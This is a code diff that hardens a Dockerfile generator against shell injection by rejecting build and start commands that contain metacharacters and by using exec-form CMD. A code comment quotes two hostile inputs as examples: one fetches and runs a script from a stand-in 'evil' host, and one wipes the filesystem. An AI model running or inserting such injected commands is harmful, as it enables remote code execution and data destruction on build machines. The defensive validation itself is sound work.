@@ -180,6 +180,10 @@ export interface GenerateDockerfileOpts {
  * deploy, and refuses exotic stacks so we don't fake a working image.
  */
 export function generateDockerfile(opts: GenerateDockerfileOpts): string | null {
+  // R5: refuse dangerous user fields up front — never emit a Dockerfile whose
+  // RUN/CMD lines can be broken out of with `;`, `$( )`, backticks, pipes.
+  if (validateBuildFields(opts.buildCmd, opts.startCmd)) return null
+
   const port = opts.port && opts.port > 0 ? opts.port : defaultPortFor(opts.stack)
   const buildCmd = (opts.buildCmd || "").trim()
   const startCmd = (opts.startCmd || "").trim()
@@ -302,21 +306,38 @@ export function defaultPortFor(stack: DetectedStack): number {
   }
 }
 
-/** Parse the last EXPOSE port from a Dockerfile (final stage wins). */
+import { hasShellMetachars, execFormArgv } from "./security"
+
+/** Parse the first EXPOSE port from a Dockerfile (best-effort). */
 export function parseExposePort(dockerfile: string): number | null {
-  const matches = [...String(dockerfile).matchAll(/^\s*EXPOSE\s+(\d+)/gim)]
-  if (!matches.length) return null
-  const n = Number(matches[matches.length - 1][1])
+  const m = dockerfile.match(/^\s*EXPOSE\s+(\d+)/im)
+  if (!m) return null
+  const n = Number(m[1])
   return Number.isFinite(n) && n > 0 ? n : null
+}
+
+/**
+ * R5: user-controlled build/start fields are validated BEFORE they land in a
+ * generated Dockerfile. A field containing shell metacharacters would break
+ * out of its line and execute arbitrary commands during `docker build` (e.g.
+ * `$(curl evil|sh)` or `; rm -rf /`). We refuse to generate a Dockerfile for
+ * such input — the caller fails the deploy honestly.
+ */
+export function validateBuildFields(buildCmd?: string | null, startCmd?: string | null): string | null {
+  for (const [name, v] of [["buildCmd", buildCmd], ["startCmd", startCmd]] as const) {
+    if (v && hasShellMetachars(v)) {
+      return `${name} contains shell metacharacters (${v}) — generated images can't run arbitrary shell. Use a single command + args, or supply your own Dockerfile.`
+    }
+  }
+  return null
+}
+
+/** exec-form CMD: argv JSON, so $(...) / backticks are literal text, not shell. */
+function jsonCmd(cmd: string): string {
+  return JSON.stringify(execFormArgv(cmd))
 }
 
 function shellJoin(cmd: string): string {
   // Dockerfile RUN takes a shell form; escape only what would break the line.
   return cmd.replace(/\r?\n/g, " && ")
-}
-
-function jsonCmd(cmd: string): string {
-  // Prefer JSON-form CMD via sh -c so user start commands with flags work.
-  const escaped = cmd.replace(/\\/g, "\\\\").replace(/"/g, '\\"')
-  return `["sh", "-c", "${escaped}"]`
 }
